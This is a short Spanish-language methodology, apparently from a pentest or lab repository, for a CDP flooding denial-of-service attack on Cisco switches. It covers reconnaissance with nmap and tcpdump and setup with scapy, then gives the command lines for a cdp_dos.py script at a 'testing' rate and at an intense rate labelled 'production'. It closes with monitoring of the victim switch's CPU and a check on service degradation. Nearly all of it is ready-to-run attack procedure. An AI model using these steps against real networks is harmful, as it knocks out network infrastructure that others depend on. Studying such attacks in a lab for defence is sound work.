# Metodología del Ataque CDP DoS

## 1. Reconocimiento

### 1.1 Identificar la topología
- Verificar conectividad de red
- Identificar switches con CDP habilitado
- Mapear VLANs y segmentos

### 1.2 Comandos de reconocimiento
```bash
# Verificar IP y gateway
ip addr show
ip route show

# Escanear red local
nmap -sn 10.21.23.0/24

# Capturar tráfico CDP existente
sudo tcpdump -i eth0 ether dst 01:00:0c:cc:cc:cc -c 10
```

## 2. Preparación del Ataque

### 2.1 Instalar herramientas
```bash
pip3 install scapy colorama
```

### 2.2 Verificar privilegios
```bash
sudo whoami  # Debe devolver: root
```

## 3. Ejecución del Ataque

### 3.1 Ataque básico (testing)
```bash
sudo python3 scripts/cdp_dos.py -i eth0 -c 500 -d 0.001
```

### 3.2 Ataque intenso (producción)
```bash
sudo python3 scripts/cdp_dos.py -i eth0 -c 10000 -d 0.0001
```

## 4. Monitoreo del Impacto

### 4.1 En el switch víctima
```cisco
show cdp neighbors
show cdp traffic
show processes cpu sorted
```

### 4.2 Captura de evidencias
```bash
sudo tcpdump -i eth0 -w cdp_attack.pcap
```

## 5. Análisis Post-Ataque

- Revisar logs del switch
- Analizar capturas en Wireshark
- Documentar cambios en CPU/memoria
- Verificar degradación del servicio
